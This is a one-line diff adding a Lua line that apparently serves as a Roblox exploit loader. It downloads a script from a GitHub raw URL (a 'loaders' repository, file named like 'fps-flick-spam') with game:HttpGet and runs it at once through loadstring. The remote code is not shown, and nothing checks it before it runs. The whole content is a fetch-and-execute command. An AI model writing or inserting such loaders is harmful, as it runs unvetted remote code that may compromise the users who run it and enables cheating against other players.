@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/fps-flick-spam2-k4itg288hqa8c6.lua"))()
